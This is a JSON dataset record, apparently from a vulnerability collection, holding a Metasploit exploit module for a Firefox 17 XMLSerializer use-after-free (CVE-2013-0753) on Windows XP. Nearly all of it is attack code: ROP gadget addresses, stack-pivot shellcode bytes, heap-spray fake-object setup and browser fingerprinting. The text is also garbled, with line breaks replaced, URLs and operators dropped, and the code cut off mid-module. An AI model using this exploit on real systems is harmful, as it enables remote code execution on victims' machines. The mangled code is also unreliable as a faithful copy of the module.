{
    "text": "vul_name : Firefox XMLSerializer Use After Free ， vul_cve : CVE-2013-0753 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : RopDb ， super ( update_info ( info ,  ， 'Name' => 'Firefox XMLSerializer Use After Free' ,  ， 'Description' => %q{ ， This module exploits a vulnerability found on Firefox 17.0 ( < 17.0.2 )  , specifically ， an use after free of an Element object , when using the serializeToStream method ， with a specially crafted OutputStream defining its own write function. This module ， has been tested successfully with Firefox 17.0.1 ESR , 17.0.1 and 17.0 on Windows XP ， SP3. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'regenrecht' ,  # Vulnerability Discovery , Analysis and PoC ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-0753' ]  ,  ，  [ 'OSVDB' , '89021' ]  ,  ，  [ 'BID' , '57209' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'process' ,  ， 'PrependMigrate' => true ， } ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ,  ， 'DisableNops' => true ,  ， 'Space' => 30000 # Indeed a sprayed chunk , just a high value where any payload fits ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Firefox 17 / Windows XP SP3' ,  ， { ， 'FakeObject' => 0x0c101008 ,  # Pointer to the Sprayed Memory ， 'FakeVFTable' => 0x0c10100c ,  # Pointer to the Sprayed Memory ， 'RetGadget' => 0x77c3ee16 ,  # ret from msvcrt ， 'PopRetGadget' => 0x77c50d13 ,  # pop # ret from msvcrt ， 'StackPivot' => 0x77c15ed5 ,  # xcht eax , esp # ret msvcrt ， } ，  ]  ，  ]  ,  ， 'DisclosureDate' => 'Jan 08 2013' ,  ， 'DefaultTarget' => 0 )  ， end ， def stack_pivot ， pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\" # mov eax , fs :  [ 0x18 # get teb ， pivot \"\\x83\\xC0\\x08\" # add eax , byte 8 # get pointer to stacklimit ， pivot \"\\x8b\\x20\" # mov esp ,  [ eax ]  # put esp at stacklimit ， pivot \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp , -2000 # plus a little offset ， end ， end ， agent = request.headers [ 'User-Agent' ]  ， vprint_status ( \"Agent :  # {agent}\" )  ， print_error ( \"Windows XP not found , sending 404 :  # {agent}\" )  ， send_not_found ( cli )  ， end ， unless agent = ~ /Firefox\\/17/ ， print_error ( \"Browser not supported , sending 404 :  # {agent}\" )  ， send_not_found ( cli )  ， end ，  # Fake object landed on 0x0c101008 if heap spray is working as expected ， code = [  ， target [ 'FakeVFTable' ]  ,  ， target [ 'RetGadget' ]  ,  ， target [ 'RetGadget' ]  ,  ， target [ 'RetGadget' ]  ,  ， target [ 'RetGadget' ]  ,  ， target [ 'PopRetGadget' ]  ,  ， 0x88888888 ,  # In order to reach the call to the virtual function , according to the regenrecht's analysis ，  ] .pack ( \"V * \" )  ， code [ target [ 'RetGadget' ] .pack ( \"V\" )  * 183 # Because you get control with \"call dword ptr [ eax+2F8h ] \" , where eax => 0x0c10100c ( fake vftable pointer )  ， code [ target [ 'PopRetGadget' ] .pack ( \"V\" )  # pop # ret ， code [ target [ 'StackPivot' ] .pack ( \"V\" )  # stackpivot # xchg eax # esp # ret ， code generate_rop_payload ( 'msvcrt' , stack_pivot + payload.encoded , {'target'=>'xp'} )  ， js_code = Rex : Text.to_unescape ( code , Rex : Arch.endian ( target.arch )  ， js_random = Rex : Text.to_unescape ( rand_text_alpha ( 4 )  , Rex : Arch.endian ( target.arch )  ， js_ptr = Rex : Text.to_unescape (  [ target [ 'FakeObject' ] .pack ( \"V\" )  , Rex : Arch.endian ( target.arch )  ， content = -HTML",
    "time": "2013.08.29"
}